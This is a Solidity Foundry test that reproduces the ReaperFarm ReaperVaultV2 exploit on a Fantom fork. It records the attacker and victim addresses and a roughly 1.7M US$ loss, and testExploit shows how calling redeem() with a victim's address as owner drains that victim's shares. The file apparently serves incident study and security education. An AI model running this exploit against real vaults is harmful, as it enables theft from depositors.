// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1.7M US$
// Attacker : 0x5636e55e4a72299a0f194c001841e2ce75bb527a (ReaperFarm Exploiter 1 - who trigger the exploit)
// Attacker : 0x2c177d20b1b1d68cc85d3215904a7bb6629ca954 (ReaperFarm Exploiter 2 - who receive the fund)
// AttackContract : 0x8162a5e187128565ace634e76fdd083cb04d0145
// VulnerableContract : https://ftmscan.com/address/0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D#code#F1#L324 (rfUSDC)

// @Info
// Example Tx in this reproduce : https://ftmscan.com/tx/0xc92ls9f3b9312ff26be0adb1c3ff832dbdafdcbcaad33d002744effd515e53c9d5
// Owner 1 : 0x59cb9f088806e511157a6c92b293e5574531022a
// Owner 2 : 0xc010adc2c28a66fbb2107993bf6ede264eca8e54
// Owner 3 : 0x37eedb7ac276bd6c894e81b8937b0b0bab154e22
// Owner 4 : 0x8034aaff3980487a49ca69341d444fcc000088af
// Owner 5 : 0x9e6affa8a14174ca4e931a2d6b7056c41b9beeb6

// @Analysis
// Official post-mortem : https://twitter.com/Reaper_Farm/status/1554500909740302337
// Beosin : https://twitter.com/BeosinAlert/status/1554476940593340421

contract Attacker is Test {
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IReaperVaultV2 constant ReaperVault = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);
    IERC20 constant USDC = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);

    function setUp() public {
        console.log("This is a simple PoC that shows how attacker abuse the ReaperVaultV2 contract");
        cheat.createSelectFork("fantom", 44_045_899);
        cheat.label(address(ReaperVault), "ReaperVault");
        cheat.label(address(USDC), "USDC");
    }

    function testExploit() public {
        address victim = 0x59cb9F088806E511157A6c92B293E5574531022A;
        emit log_named_decimal_uint("Victim ReaperUSDCVault balance", ReaperVault.balanceOf(victim), 6);
        emit log_named_decimal_uint("Attacker USDC balance", USDC.balanceOf(address(this)), 6);

        console.log("Exploit...");
        uint256 victim_bal = ReaperVault.balanceOf(victim);
        ReaperVault.redeem(victim_bal, address(this), victim);

        emit log_named_decimal_uint("Victim ReaperUSDCVault balance", ReaperVault.balanceOf(victim), 6);
        emit log_named_decimal_uint("Attacker USDC balance", USDC.balanceOf(address(this)), 6);
    }
}

interface IReaperVaultV2 {
    function balanceOf(address owner) external view returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}
